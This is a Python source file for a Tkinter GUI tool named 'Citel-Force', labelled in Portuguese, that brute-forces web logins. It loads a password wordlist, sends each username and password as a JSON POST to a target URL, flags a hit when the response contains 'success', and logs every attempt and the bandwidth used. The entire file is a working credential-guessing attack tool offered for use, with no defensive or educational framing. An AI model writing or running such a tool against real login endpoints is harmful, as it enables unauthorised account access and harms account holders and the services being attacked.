import aiohttp
import asyncio
import tkinter as tk
from tkinter import filedialog, messagebox
import psutil

async def test_password(session, username, password, url, bandwidth_label, attempts_label, log_text_widget):
    data = {"username": username, "password": password}
    async with session.post(url, json=data) as response:
        attempts_label.config(text=f"Tentativas: {int(attempts_label.cget('text').split()[-1]) + 1}")
        log_text_widget.config(state=tk.NORMAL)
        log_text_widget.insert(tk.END, f"Usuário: {username}, Senha: {password}\n")
        log_text_widget.config(state=tk.DISABLED)
        if response.status == 401:
            return False
        elif "success" in await response.text():
            return True
        return False

async def brute_force(username, url, wordlist_file, result_label, bandwidth_label, attempts_label, log_text_widget):
    passwords = []
    try:
        with open(wordlist_file, "r") as file:
            passwords = [line.strip() for line in file]
    except FileNotFoundError:
        messagebox.showerror("Erro", f"Arquivo {wordlist_file} não encontrado.")
        return

    total_bandwidth_sent = 0
    async with aiohttp.ClientSession() as session:
        for password in passwords:
            if await test_password(session, username, password, url, bandwidth_label, attempts_label, log_text_widget):
                result_label.config(text=f"Senha correta encontrada: {password}")
                return

            # Monitoramento da largura de banda
            current_bandwidth_sent = psutil.net_io_counters().bytes_sent
            bandwidth_used = current_bandwidth_sent - total_bandwidth_sent
            total_bandwidth_sent = current_bandwidth_sent
            bandwidth_label.config(text=f"Bandwidth Enviado: {bandwidth_used} bytes")

        result_label.config(text="Nenhuma senha válida encontrada.")

def browse_file():
    file_path = filedialog.askopenfilename()
    file_entry.delete(0, tk.END)
    file_entry.insert(0, file_path)

def start_bruteforce():
    username = username_entry.get()
    url = url_entry.get()
    wordlist_file = file_entry.get()

    loop = asyncio.new_event_loop()
    asyncio.set_event_loop(loop)

    loop.run_until_complete(brute_force(username, url, wordlist_file, result_label, bandwidth_label, attempts_label, log_text_widget))

# Função para exibir o log de tentativas
def view_log(log_text, parent_window):
    log_window = tk.Toplevel(parent_window)
    log_window.title("Log de Tentativas")

    log_label = tk.Label(log_window, text="Tentativas:")
    log_label.pack()

    log_text_widget = tk.Text(log_window, wrap=tk.WORD, width=50, height=20)
    log_text_widget.pack()

    log_text_widget.insert(tk.END, log_text)

    log_text_widget.config(state=tk.DISABLED)  # Impede que o texto seja editado

log_text = ""

# Criando a janela principal
window = tk.Tk()
window.title("Citel-Force V1.0.0")

# Criação dos elementos da GUI
tk.Label(window, text="Nome de Usuário:").pack()
username_entry = tk.Entry(window)
username_entry.pack()

tk.Label(window, text="URL de Destino:").pack()
url_entry = tk.Entry(window)
url_entry.pack()

tk.Label(window, text="Selecione o Arquivo de Wordlist:").pack()
file_entry = tk.Entry(window)
file_entry.pack()
tk.Button(window, text="Procurar", command=browse_file).pack()

tk.Button(window, text="Iniciar Brute Force", command=start_bruteforce).pack()

result_label = tk.Label(window, text="")
result_label.pack()

bandwidth_label = tk.Label(window, text="Bandwidth Enviado: 0 bytes")
bandwidth_label.pack()

attempts_label = tk.Label(window, text="Tentativas: 0")
attempts_label.pack()

log_button = tk.Button(window, text="Visualizar Log", command=lambda: view_log(log_text, window))
log_button.pack()

log_text_widget = tk.Text(window, wrap=tk.WORD, width=50, height=20)
log_text_widget.pack()

log_text_widget.config(state=tk.DISABLED)  # Impede que o texto seja editado

window.mainloop()
